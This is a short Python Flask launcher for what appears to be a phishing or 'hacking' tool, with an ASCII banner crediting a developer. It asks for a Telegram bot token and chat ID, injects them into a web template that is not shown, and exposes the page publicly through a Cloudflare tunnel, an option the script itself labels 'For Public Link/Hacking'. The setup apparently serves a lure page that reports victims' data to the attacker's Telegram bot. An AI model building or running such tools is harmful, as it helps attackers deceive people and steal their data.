import os
import subprocess
import time
from flask import Flask, render_template

app = Flask(__name__)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    \033[1;32m
     __  __             _     _      _    _            _             
    |  \/  |           (_)   | |    | |  | |          | |            
    | \  / |_   _ _ __  _ ___| |__  | |__| | __ _  ___| | _____ _ __ 
    | |\/| | | | | '_ \| / __| '_ \ |  __  |/ _` |/ __| |/ / _ \ '__|
    | |  | | |_| | | | | \__ \ | | || |  | | (_| | (__|   <  __/ |   
    |_|  |_|\__,_|_| |_|_|___/_| |_||_|  |_|\__,_|\___|_|\_\___|_|   
    
    \033[1;31m[+] Developer: Munish Kumar
    \033[1;34m[+] Mode: Local + Cloudflare Support
    \033[1;37m------------------------------------------------------------
    """)

banner()
token = input("\033[1;33m[?] Enter Bot Token: \033[0m")
chatid = input("\033[1;33m[?] Enter Chat ID: \033[0m")

print("\n\033[1;36m[ Select Mode ]")
print("1. Localhost (For testing)")
print("2. Cloudflare (For Public Link/Hacking)\033[0m")
choice = input("\n[#] Select Option: ")

@app.route('/')
def home():
    return render_template('index.html', bot_token=token, chat_id=chatid)

def start_cloudflare():
    print("\033[1;32m[*] Starting Cloudflare Tunnel...\033[0m")
    # यह कमांड बैकग्राउंड में क्लाउडफ्लेयर चलाएगी और लिंक दिखाएगी
    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:8080'], 
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    print("\033[1;33m[*] Waiting for Public Link...\033[0m")
    time.sleep(5) # लिंक जनरेट होने का इंतज़ार
    print("\033[1;32m[!] Cloudflare is active! Check the terminal for 'https://...' link.\033[0m")

if __name__ == '__main__':
    if choice == '2':
        start_cloudflare()
    
    print("\033[1;32m[*] Web Server starting on Port 8080...\033[0m")
    app.run(host='0.0.0.0', port=8080, debug=False)
